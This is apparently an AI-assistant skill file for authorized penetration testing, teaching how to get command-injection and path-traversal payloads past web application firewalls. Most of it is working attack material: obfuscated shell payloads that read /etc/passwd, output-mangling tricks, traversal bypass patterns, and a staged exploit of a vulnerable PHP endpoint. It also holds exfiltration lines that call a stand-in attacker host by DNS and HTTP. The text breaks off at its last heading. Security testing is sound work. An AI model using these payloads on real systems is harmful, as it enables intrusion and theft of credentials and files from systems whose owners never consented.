---
name: cmdi-waf-evasion
author: "@souljasec"
license: MIT
description: Advanced WAF evasion for authorized bug bounty / pentest — primarily OS Command Injection, also Path Traversal / LFI. Use whenever the user is testing a target that filters, sanitizes, or WAF-blocks command injection or path traversal — including blocked shell operators (`;`, `|`, `&&`, `||`, `$()`, backticks), blacklisted binaries (`cat`, `nc`, `bash`, `wget`, `curl`), response-body filtering (e.g. WAF strips `/etc/passwd` from responses), CloudFront / AWS WAF / Cloudflare / Akamai / ModSecurity rules that block 3+ `..` sequences in URLs, or any RCE / LFI attempt that "works locally but the WAF blocks it". Covers WAF detection methodology (operator monitoring, signature matching, response inspection), low-noise reconnaissance binaries (`vmstat`, `uptime`, `lsblk`, `lscpu`, `uname`, `ss`, `findmnt`, `dig @localhost`, `stat`), payload obfuscation (quote-concat, encoding, IFS/variable tricks), indirect file-read / response-mangling (`od -c`, `rev`, `cut -d:`, `dd`, `gzip|base64`), path-traversal bypass techniques (interleaved padding, double-encoding, overlong UTF-8, paired-pad with proper validation), and the universal "validate against known-existing file" methodology that distinguishes real bypass from SPA-fallback noise. Use proactively whenever a user mentions WAF blocking RCE, "command injection bypass", "filter bypass", "blacklist bypass", "cat blocked", "stealth payload", "path traversal blocked", "..%2F blocked", "CloudFront 400", or shows a vulnerable shell-exec sink (`system()`, `exec()`, `shell_exec()`, `subprocess`, `Runtime.exec`) or file-read sink behind any filter. 中文触发词：命令注入绕过、WAF绕过、命令执行、过滤绕过、黑名单绕过、RCE 绕过、命令注入、路径穿越、目录穿越绕过。
---

# Advanced WAF Analysis & Evasion — Command Injection & Path Traversal

> **Authorization gate.** This skill is for authorized bug bounty, pentest, CTF, and lab engagements. Confirm the target is in-scope (HackerOne / Bugcrowd policy, written ROE, owned lab) before running any payload. If scope is unclear, stop and ask.

> **Scope of this skill.** Sections §1–§5 focus on **OS command injection** behind WAFs. §6 covers **path-traversal / LFI** WAF bypass against managed rules (CloudFront, AWS WAF, Cloudflare, Akamai, OWASP CRS). §7 is the **universal "validate against a known-existing target"** methodology that applies to every blind-or-filtered technique in this skill.

## Core mental model: think like the WAF, not like the shell

A WAF cannot execute your payload. It can only **match patterns** in the request, and (if configured) in the response. Every evasion you write is one of these four moves:

| Move | What you're defeating | Example |
|---|---|---|
| **1. Change the request shape** so the regex no longer matches | Signature blacklist on operators/binaries | `'c''a''t'` instead of `cat` |
| **2. Use a token the WAF didn't blacklist** | Incomplete blacklist | `od -c` instead of `cat` |
| **3. Change the response shape** so the body no longer matches | Response-body inspection | `rev /etc/passwd` instead of `cat /etc/passwd` |
| **4. Move the data off the response entirely** | Both request and response filtering | OOB DNS exfil via `dig`, blind file-read into TCP, etc. |

Almost every successful bypass is a stacking of these. The art is **stacking the minimum** — over-obfuscation creates its own signature ("base64 + eval-style payload" is itself a flagged pattern in many WAFs).

**Stealth principle:** lowest-signature payload that gets you one bit of confirmed code execution. *Confirm the channel first, expand later.*

---

## 1. WAF Detection Methodology

Before crafting a bypass, model what you're up against. Most managed WAFs (Cloudflare, AWS WAF, Akamai, F5 ASM, Imperva, ModSecurity/OWASP CRS, Sucuri) combine three layers:

### 1a. Operator monitoring (the cheapest signal)

WAFs run regex against the raw request looking for shell metacharacters. Common high-confidence triggers:

| Operator | Why it's flagged | Notes |
|---|---|---|
| `;` | Command separator | Often URL-decoded first; `%3B` rarely helps |
| `|` `||` | Pipe / OR | `||` is a strong signal (no SQL false-positive) |
| `&` `&&` | Background / AND | `&` alone has many false-positives in querystrings, so single-`&` is *sometimes* allowed |
| `$()` `` ` ` `` | Command substitution | Almost always blocked together |
| `\n` `\r` | Newline-as-separator (CRLF→sh) | Often missed; `%0a` is one of the best operators when allowed |
| `<()` `>()` | Process substitution (bash) | Rarely in blacklists, often works |
| `${IFS}` | Field separator | Often blocked because it's so well-known |

**Practical implication:** test one operator at a time with a benign payload (`||id`, `;id`, `%0aid`, `<(id)`) to map *exactly* which operator the WAF is blocking. Don't assume — different WAF rulesets block different subsets.

### 1b. Signature matching on binaries (the blacklist)

WAFs ship blacklists of "suspicious" command names. Typical members:

```
cat, less, more, head, tail, nc, ncat, netcat, bash, sh, zsh, ksh,
wget, curl, fetch, python, python3, perl, ruby, php, node,
nslookup, ping (sometimes), dig (sometimes), whoami, id (sometimes),
chmod, chown, base64, xxd, awk, sed, find, locate
```

**Two important properties of these lists:**

1. **They are word-boundary regex.** `cat` matches `cat ` but NOT `c'at`, `c\at`, `${a:-c}at`, or `/usr/bin/c""at`. This is the entire basis of payload obfuscation.
2. **They are incomplete.** No vendor has every Linux binary. The "non-standard binaries" library in §2 is your edge.

### 1c. Response inspection (the hardest layer)

The mature WAFs also inspect the **response body** for leaked sensitive content. Patterns they look for:

- `/etc/passwd` structural signature: `root:x:0:0:` or repeated `:0:0:`/`/bin/` lines
- SSH keys: `-----BEGIN OPENSSH PRIVATE KEY-----`, `ssh-rsa AAAA`
- AWS metadata: `ami-id`, `instance-id`, `iam/security-credentials`
- Cloud creds: `AKIA[0-9A-Z]{16}`, `aws_secret_access_key`
- Shadow / hash files: `$6$`, `$y$` prefixes
- Reverse-shell stubs in responses (echoed bash code)

**Practical implication:** a request that succeeds on the server can still be blocked at egress. If you can get the binary to run but no data comes back, you're hitting response inspection — switch to §4 (mangling) or to an OOB channel.

### 1d. Detection map — what to do first

```
1. Run `||id` (benign, tiny). Got `uid=...` back? You have RCE.
   - If blocked: try alternatives — %0aid, $(id), `id`, <(id), &id&
2. Got operator working but `cat /etc/passwd` returns nothing/blocked?
   - Try replacing the BINARY first (od, rev, lsblk) before obfuscating
3. Got the binary running but response is empty / 403?
   - Response-body inspection. Move to §4: mangle output or go OOB.
4. Nothing works at all?
   - Confirm injection is real (sleep-based: `||sleep 5`) before further obfuscation
```

---

## 2. Evasion Strategy — Non-Standard ("Low-Noise") Binaries

The fastest bypass is often **don't bypass — substitute**. The binaries below are rarely on WAF blacklists but give you everything you need to confirm RCE and gather host intel.

### 2a. System intel (no auth needed, no obvious "RCE" feel)

| Binary | What it leaks | Example payload (after `||`) |
|---|---|---|
| `uname -a` | Kernel, host, arch (great for fingerprinting) | `\|\|uname -a` |
| `uptime` | Load + boot time (confirms exec + gives runtime info) | `\|\|uptime` |
| `vmstat` | Memory/CPU/IO; output is multi-line and unique | `\|\|vmstat` |
| `lscpu` | CPU model, vendor, virtualization (detects EC2/GCP/k8s) | `\|\|lscpu` |
| `lsblk` | Disks, mountpoints (reveals docker, EBS volumes) | `\|\|lsblk` |
| `mount` / `findmnt` | Mounted filesystems incl. `/proc`, NFS, secrets mounts | `\|\|findmnt` |
| `df -h` | Disk usage + mountpoints | `\|\|df -h` |
| `lsmod` | Loaded kernel modules | `\|\|lsmod` |
| `getent passwd` | Same info as `/etc/passwd` — often not blacklisted | `\|\|getent passwd` |
| `compgen -c` (bash) | Lists every command available to the shell | `\|\|compgen -c` |

### 2b. Network & filesystem recon

| Binary | Purpose | Example |
|---|---|---|
| `ss -tlnp` | Listening sockets + processes (replaces `netstat`) | `\|\|ss -tlnp` |
| `ip a` / `ip route` | Interface and routing info | `\|\|ip a` |
| `dig @localhost ANY .` | Confirms outbound DNS + local resolver behavior | `\|\|dig @localhost example.com` |
| `host`, `getent hosts` | DNS lookup without `nslookup`/`dig` if those are blocked | `\|\|getent hosts example.com` |
| `stat /etc/shadow` | Existence/permissions of sensitive files without reading them | `\|\|stat /etc/shadow` |
| `find /etc -maxdepth 1` | Directory listing without `ls` | `\|\|find /etc -maxdepth 1` |
| `mktemp` | Confirms write access to /tmp; useful as exec confirmation | `\|\|mktemp` |
| `readlink /proc/self/exe` | Shows what the running interpreter is | |
| `wall <text>` / `write` | Broadcast to TTYs (rarely seen, sometimes works) | |

### 2c. OOB-friendly binaries (for blind RCE)

When the response is filtered/empty, push data out via DNS/HTTP:

| Channel | Example |
|---|---|
| DNS (most reliable) | `\|\|dig $(whoami).attacker.tld` (rebuild with concat if `$()` blocked) |
| HTTP via wget/curl alternatives | `getent hosts $(whoami).attacker.tld` — uses DNS too |
| Time-based confirmation | `\|\|sleep 5` (no exfil, just confirms execution) |
| ICMP (rarely allowed egress, but try) | `ping -c1 $(whoami).attacker.tld` |

**Why this matters:** the binaries above produce *useful response data* but don't trip "RCE keyword" alerts. A 12-line `vmstat` output in your response body is just as proof-of-RCE as `id`, and the WAF has no rule for it.

---

## 3. Evasion Strategy — Payload Obfuscation

When you must use a blacklisted binary, change its *spelling* so the regex misses while the shell still parses it correctly.

### 3a. Quote concatenation — the workhorse

The shell concatenates adjacent quoted strings. `c''a''t` parses as the literal token `cat`, but no regex looking for `\bcat\b` will match it.

```bash
# All of these execute as `cat /etc/passwd`:
c'a't /etc/passwd
'c''a''t' /etc/passwd
c"a"t /etc/p"ass"wd
ca""t /etc/pas""swd
```

**Why it works:** the lexer strips quotes after tokenization. **Why it slips past WAFs:** regex blacklists operate on raw bytes before any shell parsing.

Same trick for paths to dodge `/etc/passwd` matchers in request inspection:
```
/e't'c/p'a'sswd
/etc/p"a"sswd
/$'\145'tc/passwd   # ANSI-C quoting: \145 = 'e'
```

### 3b. Variable expansion tricks (bash)

```bash
a=cat; $a /etc/passwd                    # one-step indirection
${IFS}cat${IFS}/etc/passwd               # IFS as separator (often blocked)
${PATH:0:1}etc${PATH:0:1}passwd          # /etc/passwd built from $PATH
${HOME:0:1}                              # = / (just the slash, useful for path building)
$'\143\141\164' /etc/passwd              # ANSI-C-quoted "cat"
${!a*}                                   # variable name expansion — rare, evasive
```

**`${IFS}`** is heavily blacklisted by modern WAFs because it's so well-known. Try **`<`** (input redirection) or **`,`** inside brace expansion as separators first:

```bash
cat</etc/passwd                          # no space at all
{cat,/etc/passwd}                        # brace expansion provides the space
```

### 3c. Encoding tricks

```bash
# base64 the whole inner command (NOTE: 'base64' itself is often blacklisted)
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# Reverse the string (rev is rarely blacklisted)
echo dwssap/cte/ tac | rev | sh

# Hex / octal / unicode
$(printf '\x63\x61\x74') /etc/passwd
$(printf '\143\141\164') /etc/passwd

# Globbing — shell will expand /???/p?sswd to /etc/passwd
/???/c?t /???/p?sswd                     # if cat is blacklisted, this often slips
/?in/c?t /e??/p?ss??                     # /bin/cat /etc/passwd
```

### 3d. Wildcards for both binary AND path

Globbing is one of the most powerful and underused bypasses:

```bash
/usr/bin/c?t /etc/passwd                 # ? = single char
/usr/bin/c*t /etc/passwd                 # * = anything (matches 'cat')
/u??/?in/c?t /e??/p?ss??                 # full glob
```

Combine with quote-concat for layered obfuscation:
```bash
/u's'r/b'i'n/c?t /e't'c/p?sswd
```

### 3e. Newline injection

If `\r` or `\n` (URL-encoded `%0d` / `%0a`) is allowed, you don't need *any* shell operator. The newline IS the separator:

```
target.com/api?ip=8.8.8.8%0aid
target.com/api?ip=8.8.8.8%0acat%20/etc/passwd
```

This is often the single best operator to try first against unknown WAFs.

---

## 4. Evasion Strategy — Indirect File Reading & Response Mangling

Mature WAFs inspect responses. If `cat /etc/passwd` succeeds on the server but the response is stripped/blocked, you're at this layer.

**Goal:** make the response **not look like the original sensitive file** while preserving recoverability for you.

### 4a. Data transformation — change the bytes

| Tool | Effect | Example |
|---|---|---|
| `od -c` | Each byte shown as octal/char escape | `od -c /etc/passwd` — output is `r o o t : x : 0 : 0` with spaces, breaks `/etc/passwd` regex |
| `od -A x -t x1z` | Hex dump with offsets | `od -A x -t x1z /etc/passwd` |
| `xxd` | Hex dump (often blacklisted; `od` is the stealthier choice) | `xxd /etc/passwd` |
| `rev` | Reverses each line | `rev /etc/passwd` → `hsab/nib/:0:0:x:toor` — same data, no signature match |
| `tac` | Reverses *line order* | `tac /etc/passwd` |
| `base64` | Base64-encode response | Often blacklisted in response inspection too |
| `tr A-Z a-z` (already lowercase) or `tr a-z n-za-m` | ROT-13 encode | Survives most pattern matchers |
| `gzip -c \| base64 -w0` | Compress then encode (kills signatures completely) | Output is opaque |

### 4b. Partial / column reads — reduce the signature footprint

WAF response signatures usually need multiple matching tokens (`root`, `:0:0:`, `/bin/`). Strip them down:

```bash
cut -d: -f1 /etc/passwd                  # only usernames — no /bin/, no :0:0:
cut -d: -f1,5 /etc/passwd                # usernames + GECOS
awk -F: '{print $1}' /etc/passwd         # same effect, different tool
head -1 /etc/passwd                      # one line, fingerprint reduced
head -1 /etc/passwd | rev                # stacked: one line, reversed
```

The output is "root\ndaemon\nbin\n..." — useful to you, invisible to a WAF rule that requires the full `root:x:0:0:` pattern.

### 4c. Stream / block manipulation

```bash
# NOTE: dd does NOT mangle the bytes — a plain read of a text file still contains
# `root:x:0:0:`, so response-body inspection catches it exactly like `cat`.
# dd's real value here is OFFSET SLICING for chunked exfil, not signature evasion.
dd if=/etc/passwd bs=1 count=50 skip=0   # offset reads — exfil one 50-byte slice per request
dd if=/etc/passwd bs=1 count=50 skip=50  # next slice; reassemble slices on your end
# To actually defeat a response signature, still pipe dd through a transform:
dd if=/etc/passwd bs=1 count=200 | base64 -w0

gzip -c /etc/passwd | base64 -w0         # full mangle; recoverable on your end
zcat /var/log/*.gz | head                # read ROTATED (already-gzipped) logs without `cat`
                                         # (live /var/log/syslog is plaintext — use rev/od on it instead)

# Inline transform with sed/awk
sed 's/:/_/g' /etc/passwd                # replace the structural colons
awk '{print substr($0,1,30)}' /etc/passwd  # truncate to 30 chars/line
```

**Recovery (your side):**
```bash
# For rev:
echo "<output>" | rev

# For od -c:
echo "<output>" | xxd -r -p   # if hex; for octal use python: bytes.fromhex / int(x,8)

# For gzip|base64:
echo "<output>" | base64 -d | gunzip
```

### 4d. Out-of-band exfil — when response inspection wins

If response mangling still fails, *don't return data in the response at all*:

```bash
# DNS exfil (one of the most reliable channels):
data=$(head -1 /etc/passwd | base32 | tr -d '=' | head -c63)
dig $data.x.attacker.tld

# HTTP exfil (when DNS is filtered):
wget --post-file=/etc/passwd https://attacker.tld/
# or: getent hosts ... if wget/curl blocked

# Write to a webroot-accessible path you discovered earlier
cp /etc/passwd /var/www/html/.cache/x.txt
# then GET it back through the same vulnerable app
```

---

## 5. Practical Lab Example — payload evolution

Target (intentionally vulnerable):
```php
<?php
  // /api/ping.php
  $ip = $_GET['ip'];
  system("ping -c 4 " . $ip);
?>
```

The endpoint sits behind a typical WAF (Cloudflare-like ruleset with OWASP CRS-style filters).

### Stage 1 — naive payload (BLOCKED)

```
GET /api/ping.php?ip=8.8.8.8|cat /etc/passwd
```
Result: WAF blocks. Reasons: `|`+`cat` + `/etc/passwd` all trip signatures.

### Stage 2 — confirm injection before evading (CONFIRMS RCE)

Time-based, no blacklisted token:
```
GET /api/ping.php?ip=8.8.8.8%0asleep%205
```
Page hangs 5 seconds → injection confirmed. (We used `%0a` newline instead of `|`, and `sleep` instead of `cat`.)

### Stage 3 — replace the binary (LOW NOISE)

```
GET /api/ping.php?ip=8.8.8.8%0auptime
```
Returns load average → RCE proven with response data. No `cat`, no `/etc/passwd`, no `|`.

### Stage 4 — read the real file with mangling (BYPASSES RESPONSE INSPECTION)

```
GET /api/ping.php?ip=8.8.8.8%0a'o''d'%20-c%20/etc/p'a''s'swd
```
Decoded by the shell as: `od -c /etc/passwd`. Output is whitespace-spaced characters — does not match the `root:x:0:0:` response signature.

### Stage 5 — alternate stacks (in case the WAF tunes against stage 4)

```
# Quote-concat + cut + rev — three layers, still short:
8.8.8.8%0a'c''u''t'%20-d:%20-f1%20/etc/p'a's's'wd

# Glob-based, no quotes:
8.8.8.8%0a/?in/c?t%20/e??/p?ss??

# Brace expansion + globbing, no spaces:
8.8.8.8%0a{cat,/etc/passwd}

# OOB DNS exfil if all response paths are filtered:
8.8.8.8%0adig%20$(/?in/wh?ami).x.attacker.tld
```

**Lesson:** the working bypass was *layered minimally* — newline operator + non-blacklisted binary OR quote-concat + transform. Each stage adds one bit of obfuscation only where needed.

---

## 6. Path-Traversal WAF Evasion (CloudFront / AWS WAF / CRS)

The same mental model (§1) applies to path-traversal WAFs, but the mechanics differ from command injection. Managed WAFs ship rules that count `..` sequences in the URL and block requests above a threshold (typical: 3+ consecutive `..`). The bypass surface looks different.

In the examples below, `/SINK/` is the route under test (the URL whose handler performs filesystem reads — typically a template loader, file-download endpoint, image proxy, or any handler that uses request path components to build a file path). `<KNOWN>` is a file you have already confirmed is reachable by direct URL (use this to validate every bypass attempt — see §7).

### 6a. Operator behaviour — what to test first

Build a baseline by sending exactly N `..%2F` sequences and recording the response code/size:

```
/SINK/..%2F<KNOWN>           → 200, <FALLBACK>   (1 up — file not at this depth → SPA fallback)
/SINK/..%2F..%2F<KNOWN>      → 200, <KNOWN_SIZE> (2 ups — reached docroot, real file)
/SINK/..%2F..%2F..%2F<KNOWN> → 400, <BLOCK_BODY> (3 ups — WAF blocks here)
```

Three patterns matter:
- **The threshold line** (often 3 consecutive `..%2F` on CloudFront / AWS WAF Managed / OWASP CRS, but can be 2 or 4 depending on ruleset version). Below it, the request reaches origin. At or above, the WAF returns its branded error.
- **The block-page fingerprint.** Each WAF has a recognisable error body. CloudFront's is `<TITLE>ERROR: The request could not be satisfied</TITLE>` (typically 800–950 bytes). Cloudflare's is a CF-branded HTML; Akamai's "Reference #18..." page; AWS WAF returns a compact JSON or HTML depending on configuration. **Status code alone doesn't tell you which rule matched — body length and shape do.** Record the block-body size; it lets you distinguish "rule A" from "rule B" when payloads slip past one and trip another.
- **The SPA-fallback trap** (covered in §7). A 200 with size ≈ homepage baseline is almost never a successful file read.

### 6b. Bypass — what works against managed `..` rules

| Technique | Example | Bypass WAF? | Origin actually traverses? | Notes |
|---|---|---|---|---|
| **Leading-pad** (extends reach, does NOT bypass count) | `/SINK/AAAA/..%2F..%2F..%2F<KNOWN>` | ✗ (against a consecutive-`..` rule) | ✓ | ⚠️ **Common misconception.** A real segment *before* the `..` group does **not** break the run — the three consecutive `..%2F` are still adjacent, so a "block 3+ consecutive `..`" regex still fires. The `AAAA/..` self-cancel is only useful for *path math* (net ups), not for evasion. If you need to defeat the count, use **paired-pad**, which splits the run. |
| **Paired-pad** (splits the `..` run) | `/SINK/AAAA/..%2F..%2FBBBB/..%2F..%2F<KNOWN>` | ✓ | ✓ to docroot, ✗ beyond | Two pairs of 2 each, separated by real segments (`BBBB`). The WAF sees no consecutive run ≥ 3 anywhere in the URL. Each pair gives 1 net up (the pad cancels its own `..`). This is the actual count-bypass workhorse — use it when you can't get even 3 consecutive `..` past the WAF. |
| **Mid-path padding** | `/SINK/..%2F..%2FAAAA/..%2F..%2F<TARGET>` | ✗ | n/a | The first two consecutive `..%2F` still trigger the regex. Only **leading** padding (or full splitting into pairs) breaks the count. |
| **Double-URL-encoding** | `/SINK/%252e%252e%252f%252e%252e%252f<TARGET>` | ✗ (edge decodes once → tripped) | ✗ (origin doesn't decode twice anyway) | Edge-WAFs decode once before the rule — `%252e` becomes `%2e`, which a *different* rule then flags. Status often moves between 400 ↔ 403 ↔ different block-body size — that body-length delta confirms you slipped past rule A and tripped rule B, not a real bypass. |
| **Overlong UTF-8** | `%c0%ae%c0%ae%c0%af` (3×) | ✓ | ✗ | Passes a literal-`..` regex (the bytes aren't `..`), but modern origins (Caddy, recent Nginx, IIS post-2007) **reject** overlong UTF-8 — the bytes never get normalized back to `../`. Returns SPA fallback. Worth trying against legacy stacks (Tomcat/JBoss pre-2010, older PHP). |
| **`....//`, `....\/`, `....%2F`** | `/SINK/....//....//<TARGET>` | ✓ | ✗ | Passes the regex. Origin treats `....` as a literal four-dot directory name (which doesn't exist) and serves the SPA fallback. Only works against naive normalizers that recursively strip `../` *once*, leaving `..//`. |
| **Mixed-case `%2E%2E%2F`** | `/SINK/%2E%2E%2F%2E%2E%2F%2E%2E%2F<TARGET>` | ✗ | n/a | Modern managed WAFs normalize hex-encoding case before regex matching. Don't waste a slot. |
| **`..%01/`, `..%00/`** | `/SINK/..%01/..%01/<TARGET>` | partial (`%01` ✓, `%00` ✗) | ✗ | `%01` passes some WAFs because it's not in the literal `..` pattern, but the origin treats it as a non-`..` sequence — no traversal. `%00` is its own blocked rule. |
| **Backslash variant `..%5C`** | `/SINK/..%5C..%5C<TARGET>` | partial | ✓ on IIS/Windows, ✗ on Linux | Works on IIS/Windows backends (which treat `\` as a directory separator). On Linux origins, backslash is a literal filename character, not a traversal token. |
| **Querystring file-load** | `/SINK/?file=../../<TARGET>` | ✗ (separate rule) | n/a | Most managed WAFs have an independent "LFI in querystring" rule that fires regardless of the path rule. Usually triggers 403 rather than 400. |
| **Protocol downgrade (HTTP/1.0, HTTP/2)** | `curl --http1.0` / `--http2` | ✗ | n/a | Modern edge-WAF inspection is protocol-agnostic for path-rule matching. Don't waste a slot. |
| **`Host` / `X-Forwarded-Host` header tricks** | `-H 'Host: other.target'` | ✗ | n/a | Edge WAFs are bound to the distribution/listener, not the Host header. The path rule still fires. |

### 6c. The decision: when the bypass actually pays

**Defense-in-depth is the real boundary, not the WAF.** A successful WAF bypass for path traversal pays only if the **origin** also lets you read files outside its webroot. Modern origin servers (Caddy with `root`, Nginx with proper `root`, Apache with `<Directory>` constraints, IIS with proper request-filtering) refuse to serve anything outside the configured tree, *regardless* of how clever your URL is. So:

1. **Always test the origin's webroot constraint independently** — read a known file inside webroot via the bypass, then try a known file *just* outside webroot. If both work, you have LFI. If only the inside works, the webroot held — your bypass is a WAF-tuning curiosity, not a paid bug.
2. **`/etc/passwd` is the wrong test target** for confirming the bypass works. Use a *known file at a known depth inside the webroot* first (see §7), then push outward.
3. **A WAF-only bypass is still worth recording** — file it as a hardening recommendation in the report (or against the WAF vendor's managed-rule program), but don't claim P-level severity unless you also exfiltrate something the program considers sensitive.

### 6d. Payload menu — minimum-stealth for path-traversal

```text
# Diagnose (always do these first):
N × ..%2F                          map the WAF's `..` threshold (1, 2, 3, ...)
2 × ..%2F + <KNOWN>                sanity-check the handler reaches docroot

# Bypass the `..` count regex (paired-pad is the workhorse):
PAD/..%2F..%2F..%2F<TARGET>           # leading-pad: +1 effective up over threshold
PAD/..%2F..%2FPAD2/..%2F..%2F<TARGET> # paired-pad: works when even 3 consecutive .. is blocked

# Negative — don't burn time on these against modern managed WAFs:
%2E%2E%2F            (mixed case)            — WAF normalizes hex case
%252e%252e%252f      (double-encode)         — edge decodes once, trips a different rule
%c0%ae%c0%ae%c0%af   (overlong UTF-8)        — modern origin won't decode
....// ....%2F       (recursion-trick)       — origin treats as literal directory
--http1.0 / --http2  (protocol downgrade)    — edge inspection is protocol-agnostic
X-Forwarded-Host:    (host header tricks)    — edge WAF bound to distribution, not Host

# Stack legacy-only:
..%5C..%5C           (backslash)             — works on IIS/Windows, not Linux
?file=../../...      (querystring LFI)       — gets caught by a separate rule on managed WAFs;
                                              still try on bespoke/custom rulesets
```

---

## 7. Universal Methodology: Validate Bypasses Against a Known File

This is the single most important habit when bypassing WAFs — applies equally to command injection (§3), path traversal (§6), SSRF, and any blind technique.

### The problem

A successful bypass attempt produces a non-error response. But "non-error" has at least three meanings:

1. **Real success** — WAF passed, sink reached, data returned.
2. **WAF passed, sink reached, but no data** — your payload was syntactically valid, the WAF didn't block, but the target file doesn't exist / the command produced no output / the SSRF host didn't respond. Looks identical to (1) by status code alone.
3. **WAF passed, but routing fell through to a catch-all** — common with SPA-shell sites where any unmatched route returns the homepage with HTTP 200. Often within ±50 bytes of the baseline.

If you celebrate (3) as (1), you'll waste hours writing a report for a bug that doesn't exist.

### The fix — pin a known-good target before testing payloads

Before crafting bypasses, identify a target you **know** will return distinctive content if your payload reaches the sink:

| Vuln class | Known-good probe |
|---|---|
| **Command injection** | `||uptime` or `||uname -a` — multi-line, fingerprint-unique output that the SPA fallback can't produce |
| **Path traversal / LFI** | A file you *know* exists inside webroot at a *known* depth (anything you can fetch directly: a public JS bundle, `/robots.txt`, `/favicon.ico`, an entry script). Record its exact size when fetched directly. |
| **SSRF** | An attacker-controlled host with a unique response shape (Burp Collaborator, your own `nc -l`, an interactsh subdomain). |
| **SQLi (blind)** | A condition that toggles between a known-true and known-false response (`AND 1=1` vs `AND 1=2`). |

Now test each bypass attempt against **two endpoints in parallel**:
- **A**: the known-good target. Confirms the bypass landed at the sink.
- **B**: the actual target you want. Tells you whether the sink will deliver it.

If A succeeds but B doesn't: the bypass works, but the *target* is the problem (file doesn't exist, command produces no output, etc.).
If A fails: the bypass itself didn't work. Don't bother trying B with the same payload.

### The SPA-fallback trap — explicit checklist

When a 200 response comes back, before declaring success:

```
[ ] Response size is *distinctly* different from the baseline 200 size
    (the homepage/SPA fallback). ±50 bytes of baseline is almost always
    fallback, not success.
[ ] Response body contains *content unique* to the file you targeted
    (not just `<!DOCTYPE html>` or framework boilerplate).
[ ] Response Content-Type matches what you expected (text/plain or
    application/json for /etc/passwd; not text/html).
[ ] If you change the target filename to something *guaranteed not to
    exist*, the response changes shape. (If the response is the same,
    you're hitting the fallback regardless of input.)
```

A response that fails any of these checks is **not a bypass**.

### Worked example — separating real bypass from fallback

Targeting an edge-WAF-fronted app where `/SINK/` is the vulnerable handler and `<KNOWN>` is a file you confirmed reachable by direct URL:

```
# Baseline — homepage / SPA-shell response:
GET /                                      → 200, <BASELINE> bytes
# Known good — file we know exists in docroot:
GET /<KNOWN>                               → 200, <KNOWN_SIZE> bytes
# WAF block fingerprint:
GET /SINK/..%2F..%2F..%2F<KNOWN>           → 400, <BLOCK_BODY> bytes

# Test 1: "....//" bypass (looks promising — 200 status):
GET /SINK/....//....//<KNOWN>              → 200, ≈<BASELINE> bytes
# Size within ~50 bytes of <BASELINE> → SPA fallback. NOT a bypass.

# Test 2: paired-pad bypass:
GET /SINK/AAAA/..%2F..%2FBBBB/..%2F..%2F<KNOWN>  → 200, <KNOWN_SIZE> bytes
# Exact match to <KNOWN_SIZE>. CONFIRMED bypass.
```

The "promising" Test 1 was a trap — the response was 200 but the body was the SPA shell, not the file. Without the known-good comparison, you'd waste time scaling that payload up against `/etc/passwd` and never realise the origin was rejecting the path the whole time.

Concrete numbers from a real CloudFront engagement to anchor the pattern:
- `<BASELINE>` ≈ 53820 (homepage HTML)
- `<KNOWN_SIZE>` = 17973 (a small PHP entry file in docroot)
- `<BLOCK_BODY>` = 915 (CloudFront's "ERROR: The request could not be satisfied" page)
- Test 1's fallback came back as 53850 — only 30 bytes off `<BASELINE>` (cookie/session variance) → not a real read.
- Test 2 came back as exactly 17973 → byte-for-byte match → real read.

Your own numbers will differ per target; the *shape* of the test (baseline vs known-good vs block-body vs candidate) is what matters.

### Reporting hygiene

When you write the report:
- **Always include the known-good probe in the PoC** as Step 1. It proves your test methodology is sound and forestalls a triager pushing back with "are you sure that's not just an SPA route?"
- **State the baseline response size next to every result** so a reader can independently verify the bypass distinguishes success from fallback.

---

## How to use this skill when assisting the user

When this skill is active, the user is attempting (or planning) an authorized command-injection bypass. Your job:

1. **Always confirm authorization scope** before producing payloads against a named target. "Is this a HackerOne/Bugcrowd target, lab, or your own infrastructure?" One line, then proceed.

2. **Diagnose first, payload second.** Don't dump 20 payloads. Ask:
   - What sink is suspected (PHP `system`, Node `exec`, Python `subprocess`, etc.)?
   - What's been tried and what error/response did the WAF return?
   - Is the WAF likely Cloudflare, AWS WAF, Akamai, ModSecurity/CRS, or unknown?

   Use the detection map in §1d as a decision tree.

3. **Prefer stealth over cleverness.** When two payloads achieve the same result, recommend the one with fewer obfuscation layers. Over-obfuscation has its own signature.

4. **Stack the minimum.** Suggest one move at a time (operator → binary → mangling → OOB). Each step confirms what the WAF blocks before adding the next layer.

5. **Explain the *why*** of each payload. The user should leave understanding the technique well enough to invent a variant for the next target. Cite which detection layer (§1a / §1b / §1c) each bypass defeats.

6. **Companion skills** to consult when relevant:
   - `bug-bounty` — broader workflow, scope/impact gates, report writing
   - `security-arsenal` — payload libraries and bypass tables for other vuln classes
   - `triage-validation` — before writing a report, run the 7-Question Gate

7. **Refuse cleanly** if scope is missing, target is not authorized, or the user asks for destructive payloads (mass DoS, supply-chain, persistence/backdoor outside lab). Bypassing a WAF for proof-of-concept on an authorized program is fine; weaponizing for unauthorized targets is not.

## Quick reference — minimum-stealth payload menu

```text
# === COMMAND INJECTION ===
# Operator (try first):              # Binary swap (try second):
%0a            (newline)             uptime / vmstat / lscpu / lsblk
||  / |        (pipe)                uname -a
%0aid          (newline + id)        getent passwd      # vs cat /etc/passwd
&id&           (background)          ss -tlnp           # vs netstat
<(id)          (process sub)         findmnt            # vs mount

# Obfuscation (try third):           # Response mangle (try fourth):
'c''a''t'      quote-concat          od -c FILE
c""at          empty double-q        rev FILE
/???/c?t       globbing              cut -d: -f1 FILE
{cat,FILE}     brace expansion       gzip -c FILE | base64 -w0
$a (a=cat)     var indirection       head -1 FILE | rev

# OOB exfil (try when response inspection blocks everything):
dig $(cmd).x.attacker.tld
getent hosts $(cmd).x.attacker.tld
wget --post-file=FILE https://attacker.tld/

# === PATH TRAVERSAL (§6) ===
# Diagnose (always first):
N × ..%2F                                          map the `..` threshold (1, 2, 3, ...)
2 × ..%2F + <KNOWN>                                sanity-check the sink reaches origin

# Bypass the consecutive-`..` count (in order of stealth):
PAD/..%2F..%2F..%2F<TARGET>                        leading-pad   (+1 effective up)
PAD/..%2F..%2FPAD2/..%2F..%2F<TARGET>              paired-pad    (when 3 consec is blocked)

# Don't burn time on these against modern managed WAFs:
%2E%2E%2F            (mixed case)         — WAF normalizes hex case
%252e%252e%252f      (double-encode)      — edge decodes once → trips another rule
%c0%ae%c0%ae%c0%af   (overlong UTF-8)     — modern origin won't decode
....// ....%2F       (recursion trick)    — origin treats as literal directory name
--http1.0 / --http2  (protocol)           — edge inspection is protocol-agnostic
Host / X-Forwarded-Host  (header tricks)  — edge WAF bound to distribution
?file=../../<TARGET> (querystring)        — separate LFI rule on managed WAFs

# Legacy-stack-only:
